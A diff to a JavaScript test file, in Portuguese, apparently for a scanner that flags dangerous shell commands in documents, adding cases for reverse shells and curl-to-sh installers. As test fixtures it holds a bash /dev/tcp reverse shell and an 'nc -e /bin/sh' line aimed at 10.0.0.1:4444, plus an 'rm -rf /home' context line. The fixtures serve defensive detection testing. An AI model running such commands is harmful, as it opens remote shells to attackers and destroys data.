@@ -108,5 +108,28 @@ achados(docCodigo('rm -rf /home')).bloqueia
   ? ok('em snippet bloqueia')
   : bad('em snippet', 'deveria bloquear dentro de codigo');
 
+console.log('\nShell reverso e pipe-to-shell');
+achados(docCodigo('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')).bloqueia
+  ? ok('reverse shell em snippet bloqueia')
+  : bad('reverse shell', 'passou dentro de codigo');
+achados(docCodigo('nc -e /bin/sh 10.0.0.1 4444')).bloqueia
+  ? ok('nc -e em snippet bloqueia')
+  : bad('nc -e', 'passou dentro de codigo');
+{
+  const r = achados(doc('Um invasor abriria um shell reverso com /dev/tcp/10.0.0.1/4444.'));
+  !r.bloqueia && r.avisa
+    ? ok('reverse shell em prosa so avisa')
+    : bad('reverse shell em prosa', `bloqueia=${r.bloqueia} avisa=${r.avisa}`);
+}
+{
+  // O instalador oficial de ferramenta honesta nao pode ser reprovado, mas
+  // tambem nao pode passar calado.
+  const r = achados(docCodigo('curl -sL https://get.exemplo.com/install.sh | sh'));
+  !r.bloqueia && r.avisa
+    ? ok('pipe-to-shell avisa mesmo em snippet')
+    : bad('pipe-to-shell', `bloqueia=${r.bloqueia} avisa=${r.avisa}`);
+}
+devePassar('pipe sem shell', 'Use curl https://api.exemplo.com | jq .data para inspecionar.');
+
 console.log(`\n${pass} ok, ${fail} falha(s)\n`);
 process.exit(fail === 0 ? 0 : 1);
